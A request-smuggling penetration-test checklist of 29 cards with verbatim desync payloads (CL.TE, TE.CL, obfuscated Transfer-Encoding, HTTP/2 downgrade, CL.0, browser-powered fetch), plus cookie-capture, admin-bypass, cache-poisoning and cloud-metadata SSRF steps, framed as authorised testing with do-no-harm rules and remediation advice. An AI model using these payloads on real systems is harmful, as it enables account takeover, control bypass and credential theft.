# Request Smuggling — Checklist

Expert per-attack **test-case matrix** for Request Smuggling — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*29 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## SMUG-001 — Confirm a front-end + back-end chain exists
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Response headers across the whole app (Via/Server/X-Cache/CF-RAY)

**Test Steps:** 1. Smuggling needs two HTTP processors in a row sharing a reused connection - no chain, no desync.<br>2. Look for a CDN/LB/proxy in front of the origin: Via, Server, X-Cache, X-Served-By, CF-RAY, X-Amz-Cf-Id, Akamai headers.<br>3. Note the front-end vendor (Cloudflare/Akamai/Fastly/ALB/HAProxy/nginx) - the FE&lt;-&gt;origin parser mismatch is the bug.

**Expected Result:** Evidence of a distinct front-end and back-end (different Server banners, proxy/cache headers).

**Payload Example:**

```
GET / HTTP/1.1\r\nHost: $TARGET\r\n\r\n
# inspect Via / X-Cache / CF-RAY / Server in the response
```

**Impact:** No chain = no smuggling surface. Confirms the pre-condition and names the vendor pair to research.

**Tools:** Burp Suite, curl -v, httpx, Wappalyzer

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-002 — Confirm connection reuse &amp; HTTP/2 downgrade surface
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Keep-alive behaviour; protocol you speak vs origin speaks

**Test Steps:** 1. Confirm HTTP/1.1 keep-alive (Connection: keep-alive) or HTTP/2 to the edge.<br>2. Determine if the edge speaks H2 to you but downgrades to HTTP/1.1 at the origin (the H2 desync surface).<br>3. Map: your protocol -&gt; front-end -&gt; origin protocol. Downgrade points re-introduce classic desync.

**Expected Result:** Connection reuse confirmed; H2-&gt;H1 downgrade path identified if present.

**Payload Example:**

```
curl -v --http2 https://$TARGET/    # ALPN h2 to edge?
curl -v --http1.1 https://$TARGET/  # keep-alive?
```

**Impact:** Downgrade is where 'patched' HTTP/1 sites still smuggle; defines which technique classes to test.

**Tools:** curl, Burp (HTTP/2 tab), openssl s_client

**References:** CWE-444; 'HTTP/2: The Sequel is Always Worse' (Kettle 2021)

---

## SMUG-003 — Scout exploit gadget endpoints
**Test Category:** Recon &amp; Surface Mapping · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Reflection/store endpoints, restricted paths, cacheable pages

**Test Steps:** 1. The desync is only the door; catalogue the rooms behind it.<br>2. Find a store/reflect endpoint (comment/profile/search echo) for request-capture.<br>3. Find front-end-blocked/internal/admin paths for WAF/auth bypass.<br>4. Find cacheable responses (static, 200 w/ cache headers) for cache poisoning.

**Expected Result:** A shortlist of capture, bypass, and cache targets to aim a confirmed desync at.

**Payload Example:**

```
# capture: POST /comment  | bypass: GET /admin (403 at FE) | cache: GET /static/app.js
```

**Impact:** Pre-selecting gadgets turns a confirmed desync straight into a high-severity exploit.

**Tools:** Burp Suite, ffuf, gau

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling

---

## SMUG-004 — Safe timing detection — CL.TE probe
**Test Category:** Detection (Timing, Safe) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Any POST-capable endpoint on a chained host

**Test Steps:** 1. ALWAYS timing-first: a disagreeing back-end STALLS waiting for bytes you never send - no leftover in the pipe, no user harmed.<br>2. Send a CL.TE timing probe (front-end honours CL=4 and forwards; TE back-end waits for a chunk that never completes).<br>3. Repeat vs a fast baseline; a consistent delay = CL.TE desync candidate.

**Expected Result:** The request hangs/delays consistently vs baseline because the back-end (TE) waits for more chunk data.

**Payload Example:**

```
POST / HTTP/1.1\r\nHost: $TARGET\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\nX
```

**Impact:** Finds the desync WITHOUT poisoning the shared socket - the safety-critical first step.

**Tools:** Burp Repeater, Turbo Intruder, poc/desync_timing.py, smuggler.py

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-005 — Safe timing detection — TE.CL probe
**Test Category:** Detection (Timing, Safe) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Any POST-capable endpoint on a chained host

**Test Steps:** 1. Mirror probe: front-end honours TE (reads to 0-chunk), back-end honours CL=6 and waits for bytes that never arrive.<br>2. Send the TE.CL timing probe; repeat vs baseline.<br>3. A consistent delay = TE.CL desync candidate. No socket poisoning occurs.

**Expected Result:** Consistent delay vs baseline because the back-end (CL) waits for its declared Content-Length.

**Payload Example:**

```
POST / HTTP/1.1\r\nHost: $TARGET\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX
```

**Impact:** Safe detection of the mirror desync direction; still zero cross-user risk.

**Tools:** Burp Repeater, Turbo Intruder, poc/desync_timing.py

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-006 — CL.TE desync (FE Content-Length, BE Transfer-Encoding)
**Test Category:** Technique — Classic · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Byte-exact raw request to a chained POST endpoint

**Test Steps:** 1. FE trusts Content-Length (forwards 6 bytes); BE trusts chunked and stops at the 0-terminator, leaving trailing bytes as the next request.<br>2. Disable Burp auto-Content-Length; send raw.<br>3. The leftover byte(s) prefix the next request on the connection - replace with a full smuggled request line.

**Expected Result:** The trailing bytes after the 0-chunk are treated by the back-end as the start of the following request.

**Payload Example:**

```
POST / HTTP/1.1\r\nHost: $TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG
```

**Impact:** Primitive that lets you prepend arbitrary bytes to another user's request (capture/bypass/poison).

**Tools:** Burp Repeater (HTTP/1 raw), Turbo Intruder, poc/build_smuggle.py

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-007 — TE.CL desync (FE Transfer-Encoding, BE Content-Length)
**Test Category:** Technique — Classic · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Byte-exact raw request; embed a whole second request

**Test Steps:** 1. FE trusts chunked; BE trusts Content-Length (=4) and stops early, leaving the rest as a new request.<br>2. The chunk-size (hex) MUST equal the exact byte length of the smuggled request that follows - tune byte-by-byte.<br>3. Terminate with 0-chunk.

**Expected Result:** Back-end reads only Content-Length bytes; the embedded request is queued as the next one.

**Payload Example:**

```
POST / HTTP/1.1\r\nHost: $TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /UNIQUE HTTP/1.1\r\nHost: $TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n
```

**Impact:** Full-request smuggling primitive; the chunk-size tuning makes it deterministic.

**Tools:** Burp Repeater (HTTP/1 raw), Turbo Intruder, poc/build_smuggle.py

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-008 — TE.TE — Transfer-Encoding header obfuscation
**Test Category:** Technique — Obfuscation · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** When BOTH tiers understand chunked (plain CL.TE/TE.CL fails)

**Test Steps:** 1. Disguise one Transfer-Encoding header so one tier obeys it and the other ignores it as malformed - recreating the CL-vs-TE split.<br>2. Try each obfuscation, pairing with a CL.TE/TE.CL body.<br>3. Space-before-colon and tab variants are the most productive.

**Expected Result:** One tier honours the (obfuscated) TE header while the other treats it as invalid, re-introducing the desync.

**Payload Example:**

```
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
Transfer-Encoding:\tchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding\r\n : chunked
```

**Impact:** Bypasses defenses that reject the obvious dual-TE; keeps the desync alive on hardened stacks.

**Tools:** Burp Repeater, HTTP Request Smuggler ext

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-009 — HTTP/2 downgrade — H2.CL
**Test Category:** Technique — HTTP/2 Downgrade · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Edge speaks H2 to you, downgrades to HTTP/1.1 at origin

**Test Steps:** 1. Send an HTTP/2 request with an explicit content-length header that disagrees with the body.<br>2. H2 frames the message by length so the FE accepts it; on downgrade the FE writes your CL into HTTP/1.1 and the origin mis-frames the next request.<br>3. Test even if HTTP/1 smuggling failed - many 'patched' sites re-introduce it on downgrade.

**Expected Result:** After H2-&gt;H1 rewrite, the origin mis-frames the following request per the smuggled content-length.

**Payload Example:**

```
# HTTP/2 request (Burp HTTP/2 tab):
:method POST  :path /  :authority $TARGET
content-length: 0
<body bytes here that become the next request>
```

**Impact:** Restores classic desync on H2 front-ends; the 2021 wave hit many 'HTTP/1-safe' targets.

**Tools:** Burp (HTTP/2), HTTP Request Smuggler ext

**References:** CWE-444; 'HTTP/2: The Sequel is Always Worse' (Kettle 2021)

---

## SMUG-010 — HTTP/2 downgrade — H2.TE
**Test Category:** Technique — HTTP/2 Downgrade · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Edge H2 -&gt; origin HTTP/1.1

**Test Steps:** 1. Include transfer-encoding: chunked as an HTTP/2 header.<br>2. H2 ignores TE (it frames by length), but on downgrade the origin honours the chunked header -&gt; desync.<br>3. Combine with a chunked body to control the split.

**Expected Result:** Origin honours the smuggled chunked encoding after downgrade; H2 front-end ignored it.

**Payload Example:**

```
# HTTP/2 request:
:method POST  :path /  :authority $TARGET
transfer-encoding: chunked

0\r\n\r\nGET /UNIQUE HTTP/1.1\r\nHost: $TARGET\r\n\r\n
```

**Impact:** H2-&gt;H1 TE desync; frequently the only working class on modern edges.

**Tools:** Burp (HTTP/2), HTTP Request Smuggler ext

**References:** CWE-444; 'HTTP/2: The Sequel is Always Worse' (Kettle 2021)

---

## SMUG-011 — HTTP/2 CRLF injection / request splitting on downgrade
**Test Category:** Technique — HTTP/2 Downgrade · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** H2 header values / pseudo-headers mishandled on downgrade

**Test Steps:** 1. Inject \r\n inside an HTTP/2 header value or :path.<br>2. H2 carries it as opaque data; on downgrade the FE writes it verbatim into HTTP/1.1, splitting your request into two.<br>3. Append a full smuggled request after the injected CRLFs.

**Expected Result:** The downgraded HTTP/1.1 stream contains an extra request built from your injected CRLF sequence.

**Payload Example:**

```
# H2 header value:
foo: bar\r\nTransfer-Encoding: chunked\r\n\r\n<smuggled request>
# or CRLF in :path where the stack mishandles it
```

**Impact:** Turns an H2 header-value quirk into full request splitting/smuggling at the origin.

**Tools:** Burp (HTTP/2), HTTP Request Smuggler ext

**References:** CWE-444; 'HTTP/2: The Sequel is Always Worse' (Kettle 2021)

---

## SMUG-012 — CL.0 desync (back-end ignores Content-Length)
**Test Category:** Technique — Modern (CL.0 / 0.CL) · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Body-less endpoints: static files, redirects, some GETs-with-body

**Test Steps:** 1. Some back-ends ignore Content-Length on endpoints that 'shouldn't' have a body (treat CL as 0).<br>2. The whole body then becomes the next request on the connection.<br>3. Target /static/*, redirects, OPTIONS specifically.

**Expected Result:** The body after the headers is executed by the back-end as a separate, following request.

**Payload Example:**

```
POST /static/x.js HTTP/1.1\r\nHost: $TARGET\r\nContent-Length: 34\r\n\r\nGET /admin HTTP/1.1\r\nFoo: bar
```

**Impact:** Modern, frequently-missed desync class that works when classic CL.TE/TE.CL are patched.

**Tools:** Burp HTTP Request Smuggler, Turbo Intruder (pipeline)

**References:** CWE-444; 'Browser-Powered Request Smuggling' (Kettle 2022)

---

## SMUG-013 — 0.CL desync (front-end ignores Content-Length)
**Test Category:** Technique — Modern (CL.0 / 0.CL) · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Mirror of CL.0 - front-end treats CL as 0, back-end honours it

**Test Steps:** 1. FE forwards headers only (CL=0 in its view); BE reads the declared body.<br>2. Craft so the BE consumes the intended bytes and the remainder frames a new request.<br>3. Confirm deterministically on your own connection.

**Expected Result:** Front-end and back-end disagree on where the body ends, leaving a smuggled prefix.

**Payload Example:**

```
POST / HTTP/1.1\r\nHost: $TARGET\r\nContent-Length: 41\r\n\r\nGET /UNIQUE HTTP/1.1\r\nHost: $TARGET\r\n\r\n
```

**Impact:** Completes the CL.0/0.CL modern pair; hits stacks the classics miss.

**Tools:** Burp HTTP Request Smuggler, Turbo Intruder

**References:** CWE-444; 'Browser-Powered Request Smuggling' (Kettle 2022)

---

## SMUG-014 — TE.0 desync (chunked-as-next on body-less endpoints)
**Test Category:** Technique — 2022-2024 Wave · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Static/redirect/OPTIONS endpoints that ignore TE on one tier

**Test Steps:** 1. Mirror of CL.0 for Transfer-Encoding: one tier honours chunked, the other treats body as 0.<br>2. Send chunked (optionally obfuscated TE); trailing bytes after 0-chunk become the next request.<br>3. Aim at endpoints that shouldn't carry a body.

**Expected Result:** Trailing bytes after the terminating chunk are parsed as a fresh request by the disagreeing tier.

**Payload Example:**

```
POST /static/x.js HTTP/1.1\r\nHost: $TARGET\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nFoo: bar
```

**Impact:** Newer class extending CL.0 to TE; another route past patched classics.

**Tools:** Burp HTTP Request Smuggler, Turbo Intruder

**References:** CWE-444; 'Browser-Powered Request Smuggling' (Kettle 2022); 'HTTP/1.1 Must Die: pause-based desync' (Kettle 2024)

---

## SMUG-015 — CL.CL desync (duplicate/ambiguous Content-Length)
**Test Category:** Technique — 2022-2024 Wave · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Two Content-Length headers resolved differently per tier

**Test Steps:** 1. Send duplicate/ambiguous Content-Length where one tier trims whitespace/leading-zeros and the other doesn't.<br>2. The shorter-length view leaves trailing bytes as the next request.<br>3. Tune both values to control the split.

**Expected Result:** The two tiers compute different body lengths, leaving a smuggled remainder.

**Payload Example:**

```
POST / HTTP/1.1\r\nHost: $TARGET\r\nContent-Length: 6\r\nContent-Length: 5\r\n\r\nGxyz
```

**Impact:** Duplicate-CL parsing bug; simple but effective on lenient stacks.

**Tools:** Burp Repeater, Turbo Intruder

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling

---

## SMUG-016 — Request tunnelling (read internal-only response)
**Test Category:** Technique — 2022-2024 Wave · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** FE that blindly forwards your prefixed request to the BE

**Test Steps:** 1. Even with no reusable cross-user desync, tunnel a second request so the FE forwards it to the BE inline.<br>2. Read an INTERNAL-only response INSIDE your own response (blind-SSRF-grade), zero victim impact.<br>3. Tell-tale: TWO responses concatenated for one send.

**Expected Result:** Your single request returns two concatenated responses - the second is the internal-only endpoint's.

**Payload Example:**

```
# smuggle a second request whose response returns inside YOUR response:
GET /UNIQUE HTTP/1.1\r\nHost: internal-only.$TARGET\r\n\r\n
```

**Impact:** Safely proves internal reach (admin/internal header reflection) with NO cross-user harm - ideal PoC.

**Tools:** Burp Repeater, Turbo Intruder

**References:** CWE-444; CWE-918; 'Browser-Powered Request Smuggling' (Kettle 2022)

---

## SMUG-017 — Pause-based desync
**Test Category:** Technique — 2022-2024 Wave · **Severity:** High · **CVSS:** 8.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Streaming/early-flush/read-timeout endpoints (some CDNs/origins)

**Test Steps:** 1. Send headers + partial body, then PAUSE mid-send.<br>2. Exploit early-flush or read-timeout to split the message across the pause.<br>3. Reachable from a victim browser via fetch streams on some stacks.

**Expected Result:** The server splits your paused request into two, framing the post-pause bytes as a new request.

**Payload Example:**

```
# Turbo Intruder: send headers + partial body, stall, then flush the remainder as a new request
```

**Impact:** Newest (2024) class; can be browser-reachable, widening victim impact.

**Tools:** Turbo Intruder (stall), Burp

**References:** CWE-444; 'HTTP/1.1 Must Die: pause-based desync' (Kettle 2024)

---

## SMUG-018 — Client-side desync (browser-powered)
**Test Category:** Technique — Browser-Powered · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Origins vulnerable without any front-end; victim's own browser

**Test Steps:** 1. A desync the VICTIM'S OWN BROWSER triggers via a cross-origin fetch with keep-alive - no proxy needed.<br>2. Poisons the victim's own connection -&gt; request hijack / stored-XSS-from-self.<br>3. Test with the Browser-Powered methodology + Burp's scanner.

**Expected Result:** A cross-origin keep-alive fetch causes the victim's browser connection to mis-frame a follow-up request.

**Payload Example:**

```
# attacker page:
fetch('https://$TARGET/', {method:'POST', mode:'no-cors', credentials:'include', body:'<smuggled prefix>'})
```

**Impact:** Reaches victims with no MITM/front-end requirement - massively widens exploitability.

**Tools:** Burp scanner (browser-powered), custom HTML PoC

**References:** CWE-444; 'Browser-Powered Request Smuggling' (Kettle 2022)

---

## SMUG-019 — Connection-state — first-request routing
**Test Category:** Technique — Connection-State · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** FE that routes by the FIRST request then reuses the connection

**Test Steps:** 1. NOT framing desync: the FE decides which backend/vhost to route based only on the FIRST request, then lazily reuses it.<br>2. Send req#1 to an ALLOWED vhost to establish the route; req#2 (same connection) targets an internal vhost.<br>3. Compare fresh vs reused connection.

**Expected Result:** The second request on the connection is routed to the internal backend the first request unlocked.

**Payload Example:**

```
GET / HTTP/1.1\r\nHost: allowed.$TARGET\r\nConnection: keep-alive\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal-only.$TARGET\r\n\r\n
```

**Impact:** Reaches internal/segmented backends with no length trickery - often exposes admin vhosts.

**Tools:** Burp (single-connection group), Turbo Intruder (pipeline)

**References:** CWE-444; 'HTTP/2: The Sequel is Always Worse' (Kettle 2021)

---

## SMUG-020 — Connection-state — first-request validation
**Test Category:** Technique — Connection-State · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Edge that authenticates/validates only the FIRST request

**Test Steps:** 1. The edge validates/authenticates only req#1; req#2 on the same connection inherits that trust.<br>2. Send a benign allowed request #1, then a privileged/blocked request #2 on the same connection.<br>3. Same payload over fresh vs reused connection -&gt; different result = bug.

**Expected Result:** The privileged second request succeeds because validation was applied only to the first.

**Payload Example:**

```
<benign authenticated request #1>\r\n\r\n<privileged/blocked request #2 on same connection>
```

**Impact:** Auth/validation bypass via per-connection (not per-request) enforcement.

**Tools:** Burp (single-connection group), Turbo Intruder

**References:** CWE-444; 'HTTP/2: The Sequel is Always Worse' (Kettle 2021)

---

## SMUG-021 — Deterministic confirmation gadget (own connection)
**Test Category:** Confirmation · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any candidate desync from Phase 2

**Test Steps:** 1. Smuggle a prefix that requests a UNIQUE path with a distinctive response (404/redirect).<br>2. Send your OWN benign follow-up request to /.<br>3. If your follow-up returns the UNIQUE path's response, the prefix provably attached. All on your own connection.<br>4. Measure reliability across trials.

**Expected Result:** Your benign follow-up receives the response for the unique smuggled path - deterministic proof.

**Payload Example:**

```
...(CL.TE/TE.CL body)...\r\nGET /UNIQUE-7f3a9 HTTP/1.1\r\nHost: $TARGET\r\n\r\n
# then send: GET / HTTP/1.1 ... -> gets 404 for /UNIQUE-7f3a9
```

**Impact:** Turns a timing hint into a proven, controllable desync - the line between a real finding and a rejected blip.

**Tools:** Burp Repeater, Turbo Intruder, poc/build_smuggle.py

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling

---

## SMUG-022 — Request capture -&gt; session/cookie theft -&gt; ATO
**Test Category:** Impact — Request Capture · **Severity:** Critical · **CVSS:** 9.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** A store/reflect endpoint (comment/profile/search echo)

**Test Steps:** 1. Smuggle a request to a STORE endpoint with a large Content-Length so the victim's following request body is appended and stored.<br>2. Read the stored content to recover the victim's Cookie/Authorization header.<br>3. PROVE with your OWN second session only - never harvest real users.

**Expected Result:** Your own second session's headers (Cookie/Authorization) appear stored in the reflect/store endpoint.

**Payload Example:**

```
POST /comment HTTP/1.1\r\nHost: $TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 400\r\n\r\ncomment=
```

**Impact:** Captures another user's credentials -&gt; full account takeover. Highest-severity smuggling outcome.

**Tools:** Burp Repeater, Turbo Intruder

**References:** CWE-444; CWE-384; PortSwigger Web Security Academy: HTTP request smuggling; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-023 — WAF / front-end control bypass
**Test Category:** Impact — Control Bypass · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Paths/payloads the front-end blocks but forwards raw to origin

**Test Steps:** 1. Smuggle a request for a WAF-blocked payload or a front-end-filtered path directly to the back-end.<br>2. The origin processes what the edge would have rejected.<br>3. Confirm the blocked action succeeds via the smuggled path.

**Expected Result:** A request the front-end WAF/rules would block is executed by the back-end.

**Payload Example:**

```
...(desync body)...\r\nGET /?q=<blocked-payload> HTTP/1.1\r\nHost: $TARGET\r\n\r\n
```

**Impact:** Neutralises the edge WAF/security controls; re-enables otherwise-blocked attacks against the origin.

**Tools:** Burp Repeater, Turbo Intruder

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling

---

## SMUG-024 — Access-control bypass to /admin or internal endpoints
**Test Category:** Impact — Control Bypass · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Front-end-restricted admin/internal paths

**Test Steps:** 1. Smuggle a request to a path the front-end blocks (/admin, internal APIs, mgmt) but the back-end serves.<br>2. Read the privileged response via the confirmed desync/tunnel.<br>3. Chain to internal service exploitation where present.

**Expected Result:** The back-end returns content for an admin/internal path the front-end forbids externally.

**Payload Example:**

```
...(desync body)...\r\nGET /admin/users HTTP/1.1\r\nHost: $TARGET\r\n\r\n
```

**Impact:** Reaches admin/internal functionality gated only at the edge - often a direct path to sensitive data.

**Tools:** Burp Repeater, Turbo Intruder

**References:** CWE-444; CWE-284; PortSwigger Web Security Academy: HTTP request smuggling

---

## SMUG-025 — Web cache poisoning via desync
**Test Category:** Impact — Cache Poisoning · **Severity:** High · **CVSS:** 8.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:N)

**Where to Test / Injection Point:** Cacheable pages behind the chain

**Test Steps:** 1. Smuggle so a malicious/attacker-controlled response is cached under a victim URL key.<br>2. PROVE on a benign/unique key only, then describe the shared-cache mass impact.<br>3. Combine with reflected content for stored-XSS-at-scale.

**Expected Result:** A response you control is stored in the shared cache for a URL other users request (proven on a unique key).

**Payload Example:**

```
...(desync body)...\r\nGET /UNIQUE-cache HTTP/1.1\r\nHost: $TARGET\r\n\r\n  # then observe cached poisoned entry
```

**Impact:** One request poisons the cache for every subsequent visitor -&gt; mass stored XSS / defacement / redirect.

**Tools:** Burp Repeater, Param Miner

**References:** CWE-444; CWE-79; PortSwigger Web Security Academy: HTTP request smuggling; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-026 — Response-queue poisoning
**Test Category:** Impact — Response Desync · **Severity:** Critical · **CVSS:** 9.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed desync where responses shift on the connection

**Test Steps:** 1. Desync so responses on the connection shift by one - the next client receives the previous response.<br>2. DEMONSTRATE on your OWN traffic only (two of your own sessions).<br>3. Describe the cross-user credential/data-leak impact without touching real users.

**Expected Result:** On your own paired connections, request N receives response N+1 - the queue is desynchronised.

**Payload Example:**

```
# prove with two of YOUR OWN connections; never against live shared traffic
```

**Impact:** Every subsequent client can receive another user's response -&gt; mass credential/data leakage.

**Tools:** Burp Repeater, Turbo Intruder

**References:** CWE-444; PortSwigger 'HTTP Desync Attacks' (Kettle 2019)

---

## SMUG-027 — Internal -&gt; SSRF / RCE handoff
**Test Category:** Impact — Internal Pivot · **Severity:** Critical · **CVSS:** 9.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Back-end code-exec/SSRF/metadata endpoints reachable via smuggle

**Test Steps:** 1. Smuggle/tunnel a request to a back-end SSRF/SSTI/cmd-exec or cloud-metadata endpoint.<br>2. Hand off to the SSRF/SSTI/cmdi kit for exploitation (own tenant, read-only creds).<br>3. Prove reach benignly (unique marker / caller-identity), then stop.

**Expected Result:** The smuggled request reaches an internal endpoint that yields SSRF/RCE/metadata access.

**Payload Example:**

```
...(tunnel/desync)...\r\nGET /internal/debug?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: $TARGET\r\n\r\n
```

**Impact:** Escalates a desync into internal RCE / cloud credential theft - compound Critical.

**Tools:** Burp, SSRFmap, ysoserial (per back-end)

**References:** CWE-444; CWE-918; CWE-94; PortSwigger Web Security Academy: HTTP request smuggling

---

## SMUG-028 — False-positive filter &amp; DO-NO-HARM validation
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. Reject non-findings: a single slow/odd response (load/jitter), a tool/extension flag with no manual proof, a non-reproducible desync, or 400/errors (the server correctly REJECTING bad framing).<br>2. Require a DETERMINISTIC, controllable desync + a concrete cross-user impact (or a reliable capability).<br>3. Confirm you used benign prefixes and your OWN sessions/connections; restored connection state; kept volume low.

**Expected Result:** A deterministic, reproducible desync with real impact - not a timing blip, tool flag, or self-only effect.

**Payload Example:**

```
# checklist: deterministic? reproducible? cross-user impact? benign PoC? own connections only?
```

**Impact:** Protects users (smuggling can break the site) and your credibility (this class is most-often mis-rated).

**Tools:** Burp, manual verification

**References:** CWE-444; PortSwigger Web Security Academy: HTTP request smuggling

---

## SMUG-029 — Client-facing impact &amp; PoC package (CWE-444 + CVSS)
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead the title with the IMPACT (ATO via request capture / WAF bypass / cache poisoning), not 'a desync'.<br>2. Provide the exact raw request(s), the technique class, and OWN-connection evidence of the capability.<br>3. Set CVSS 3.1 + CWE-444 (+ outcome CWE 79/384/918/94). Remediation: normalise framing FE&lt;-&gt;BE, reject ambiguous CL/TE, disable H2-&gt;H1 downgrade or make it strict, prefer per-request routing/validation, drop connection on any framing anomaly.<br>4. De-dupe to one finding per desync primitive; note the do-no-harm discipline.

**Expected Result:** A reproducible, correctly-rated, benign PoC a client can validate and remediate.

**Payload Example:**

```
PoC: raw desync request + own-session capture proof; CVSS vector; CWE-444 + outcome CWE; fix guidance.
```

**Impact:** Converts a dangerous, easily-mis-rated bug into a defensible, actionable Critical/High report.

**Tools:** Burp, CVSS calculator, REQUEST_SMUGGLING_REPORT_TEMPLATE.md

**References:** CWE-444; FIRST CVSS v3.1; PortSwigger Web Security Academy: HTTP request smuggling  |  TOP REFERENCES: James Kettle 'HTTP Desync Attacks' + 'Browser-Powered Desync' (PortSwigger Research, BlackHat/DEFCON); PortSwigger Academy; PayloadsAllTheThings

---
